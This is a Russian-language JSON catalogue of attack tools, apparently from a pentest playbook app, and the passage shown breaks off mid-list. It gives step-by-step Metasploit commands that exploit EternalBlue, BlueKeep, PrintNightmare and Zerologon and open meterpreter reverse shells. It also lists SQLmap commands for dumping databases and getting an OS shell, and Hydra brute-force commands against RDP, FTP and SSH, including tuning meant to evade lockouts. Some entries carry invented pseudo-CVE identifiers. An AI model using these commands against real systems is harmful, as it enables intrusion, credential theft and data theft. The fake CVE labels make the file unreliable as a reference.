[
  {
    "id": "TOOL-001",
    "name": "Metasploit Framework",
    "type": "exploitation",
    "description": "Мощная платформа для разработки и выполнения эксплойтов",
    "url": "https://www.metasploit.com/",
    "applicable_attack_types": ["remote_code_execution", "privilege_escalation", "brute_force"],
    "applicable_cve": ["CVE-2017-0144", "CVE-2019-0708", "CVE-2021-44228", "CVE-2021-34527", "CVE-2020-1472"],
    "commands": {
      "CVE-2017-0144": [
        "# EternalBlue (MS17-010) через Metasploit",
        "msfconsole -q",
        "use exploit/windows/smb/ms17_010_eternalblue",
        "set RHOSTS <TARGET_IP>",
        "set LHOST <YOUR_IP>",
        "set LPORT 4444",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        "run"
      ],
      "CVE-2019-0708": [
        "# BlueKeep RDP RCE через Metasploit",
        "msfconsole -q",
        "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "set RHOSTS <TARGET_IP>",
        "set LHOST <YOUR_IP>",
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
        "run"
      ],
      "CVE-2021-34527": [
        "# PrintNightmare через Metasploit",
        "msfconsole -q",
        "use exploit/windows/dcerpc/cve_2021_1675_printspooler",
        "set RHOSTS <TARGET_IP>",
        "set LHOST <YOUR_IP>",
        "set SMBUSER <USERNAME>",
        "set SMBPASS <PASSWORD>",
        "run"
      ],
      "CVE-2020-1472": [
        "# Zerologon через Metasploit",
        "msfconsole -q",
        "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon",
        "set RHOSTS <DC_IP>",
        "set NBNAME <DOMAIN_CONTROLLER_NAME>",
        "run"
      ]
    },
    "phases": ["Scanning", "Exploitation", "Post-Exploitation"],
    "skill_level": "Intermediate",
    "os": ["Linux", "Windows"]
  },
  {
    "id": "TOOL-002",
    "name": "Nmap",
    "type": "scanning",
    "description": "Утилита сетевого сканирования и обнаружения уязвимостей",
    "url": "https://nmap.org/",
    "applicable_attack_types": ["reconnaissance", "network_scanning"],
    "applicable_cve": [],
    "commands": {
      "default": [
        "# Быстрое сканирование портов",
        "nmap -sV -sC -O <TARGET_IP>",
        "",
        "# Агрессивное сканирование",
        "nmap -A -T4 <TARGET_IP>",
        "",
        "# Поиск уязвимостей с помощью NSE-скриптов",
        "nmap --script vuln <TARGET_IP>",
        "",
        "# Сканирование конкретного порта",
        "nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>",
        "",
        "# Сканирование диапазона портов",
        "nmap -p 1-65535 -sV <TARGET_IP>"
      ]
    },
    "phases": ["Reconnaissance", "Scanning"],
    "skill_level": "Beginner",
    "os": ["Linux", "Windows"]
  },
  {
    "id": "TOOL-003",
    "name": "SQLmap",
    "type": "exploitation",
    "description": "Автоматизированный инструмент для обнаружения и эксплуатации SQL-инъекций",
    "url": "https://sqlmap.org/",
    "applicable_attack_types": ["sql_injection"],
    "applicable_cve": ["CVE-GENERIC-SQLI"],
    "commands": {
      "CVE-GENERIC-SQLI": [
        "# Базовое тестирование SQL-инъекции",
        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" --dbs",
        "",
        "# Получение всех таблиц базы данных",
        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -D <DB_NAME> --tables",
        "",
        "# Дамп конкретной таблицы",
        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -D <DB_NAME> -T <TABLE_NAME> --dump",
        "",
        "# Попытка получить OS shell",
        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" --os-shell",
        "",
        "# Тестирование POST-запроса",
        "sqlmap -u \"http://<TARGET_IP>/login\" --data=\"user=admin&pass=test\" --dbs"
      ]
    },
    "phases": ["Exploitation"],
    "skill_level": "Beginner",
    "os": ["Linux", "Windows"]
  },
  {
    "id": "TOOL-004",
    "name": "Hydra",
    "type": "brute_force",
    "description": "Быстрый онлайн-инструмент для перебора паролей (brute force)",
    "url": "https://github.com/vanhauser-thc/thc-hydra",
    "applicable_attack_types": ["brute_force"],
    "applicable_cve": ["CVE-GENERIC-BRUTEFORCE-RDP", "CVE-GENERIC-BRUTEFORCE-FTP", "CVE-GENERIC-BRUTEFORCE-SSH"],
    "commands": {
      "CVE-GENERIC-BRUTEFORCE-RDP": [
        "# Brute Force RDP (порт 3389)",
        "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
        "",
        "# Со списком логинов",
        "hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>:3389"
      ],
      "CVE-GENERIC-BRUTEFORCE-FTP": [
        "# Brute Force FTP (порт 21)",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
        "",
        "# С задержкой между попытками",
        "hydra -l admin -P passwords.txt -t 4 -W 3 ftp://<TARGET_IP>"
      ],
      "CVE-GENERIC-BRUTEFORCE-SSH": [
        "# Brute Force SSH (порт 22)",
        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
        "",
        "# С задержкой для обхода блокировки",
        "hydra -l admin -P passwords.txt -t 4 -W 5 ssh://<TARGET_IP>"
      ]
    },
    "phases": ["Exploitation"],
    "skill_level": "Beginner",
    "os": ["Linux"]
  },
